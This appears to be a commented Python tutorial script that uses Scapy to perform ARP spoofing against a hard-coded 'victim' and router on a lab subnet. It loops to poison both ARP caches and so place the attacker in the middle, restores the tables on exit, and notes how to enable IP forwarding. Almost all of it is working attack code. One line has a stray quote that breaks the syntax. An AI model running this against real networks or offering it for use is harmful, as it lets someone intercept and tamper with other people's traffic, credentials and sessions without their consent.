#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

################################################################
########## Editing the link between us and the victim ##########
################################################################

# to see fields meaning: scapy.ls(scapy.ARP)
#op - meaning is change the ARP status from request (1) to response (2)
#pdsf - IP field of the target computer (use network scanner to find IP)
#hwdst - is the MAC of the target
#psrc - ip of the router (source)

# this command will actually send an ARP response to the target saying to it that we are the router and change its ARP table

    #packet = scapy.ARP(op=2, pdst="10.0.2.7", hwdst="08:00:27:08:af:07", psrc="10.0.2.1")
    #scapy.send(packet)

#print(packet.show())
#print(packet.summary())

################################################################
########## Editing the link between us and the router ##########
################################################################

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# scan for mac address function

def get_mac(ip):
    #get the ip (ask who have the specific ip)
    arp_request = scapy.ARP(pdst=ip)

    #send broadcast request (set destination mac to the broadcast mac)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    #combine the packets to one packet
    arp_request_broadcast = broadcast/arp_request

    #use srp function to send the packet (srp is for packets with custom ether, not like sr function)
    #The “send’n’receive” functions family is the heart of Scapy. They return a couple of two lists. The first element is a list of couples (packet sent, answer), and the second element is the list of unanswered packets.
    #verbose - make the sr/p function less verbose (less data printed to terminal)
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
# count = 4 to make sure the target receive the packet

########################################################################
########## the victim computer gets arp requests all the time, #########
################### and this will change what we did ###################
############ so we need to do it repeatedly using while loop############
########################################################################

target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1""

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        # we will use dynamic printing to prevent terminal window overflow, we do it by adding comma (,), add the sys.stdout.flush(), add \r
        # in python 3 just use: print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[-] Detecting CTRL + C ..... Resetting ARP table.....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

############## Handling exceptions (try, except) ##############
#the try statement take a block of code to excecute, the except will be excecuted only when the error happen"
################################################




################### IMPORTANT NOTES ###################
# to see arp table use "arp -a"
# confirm the router ip by "route -n"
# in order to be the MITM we need to act like a router (forward packets), to do it use: "echo 1 > /proc/sys/net/ipv4/ip_forward"
